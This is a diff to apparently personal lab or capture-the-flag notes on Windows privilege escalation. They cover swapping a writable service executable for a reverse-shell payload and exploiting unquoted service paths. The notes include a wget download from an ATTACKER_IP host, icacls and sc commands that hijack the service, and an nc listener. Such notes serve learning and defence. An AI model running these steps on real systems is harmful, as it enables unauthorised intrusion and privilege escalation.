@@ -230,16 +230,19 @@ wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 #### Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
 
 ```cmd
-C:\> cd C:\PROGRA~2\SYSTEM~1\
+cd C:\PROGRA~2\SYSTEM~1\
+```
 
-C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
-        1 file(s) moved.
+```cmd
+move WService.exe WService.exe.bkp
+```
 
-C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
-        1 file(s) moved.
+```cmd
+move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+```
 
-C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
-        Successfully processed 1 files.
+```cmd
+icacls WService.exe /grant Everyone:F
 ```
 ```cmd
 nc -lvp 4445
@@ -250,11 +253,58 @@ nc -lvp 4445
 
 #### Use the following commands from a cmd.exe command prompt:
 ```cmd
-C:\> sc stop windowsscheduler
-C:\> sc start windowsscheduler
+sc stop windowsscheduler
 ```
-- `Note`: PowerShell has sc as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.
+```cmd
+sc start windowsscheduler
+```
 
+- `Note`: PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.
+```cmd
+nc -lvp 4445
+```
+- Go to svcusr1 desktop to retrieve a flag. 
+- Don't forget to input the flag at the end of this task.
+
+### Unquoted Service Paths
+- When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
+- When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. 
+- By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
+- As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine).
+- The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "`C:\Program Files\RealVNC\VNC Server\vncserver.exe`", followed by the given parameters:
+
+```cmd
+sc qc "vncserver"
+```
+
+```cmd 
+sc qc "disk sorter enterprise"
+```
+
+- When the SCM tries to execute the associated binary, a problem arises. 
+- Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
+
+| Command | Argument 1 | Argument 2 |
+|:---:|:---:|:---:|
+| C:\MyPrograms\Disk.exe | Sorter | Enterprise\bin\disksrs.exe |
+| C:\MyPrograms\Disk Sorter.exe | Enterprise\bin\disksrs.exe |  |
+| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |  |  |
+
+- This has to do with how the command prompt parses a command. 
+- Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. 
+- This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.
+
+
+#### Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
+- First, search for `C:\\MyPrograms\\Disk.exe`. 
+- If it exists, the service will run this executable.
+- If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. 
+- If it exists, the service will run this executable.
+- If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. 
+- This option is expected to succeed and will typically be run in a default installation.
+
+#### From this behaviour, the problem becomes evident. 
+- If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
 
 
 
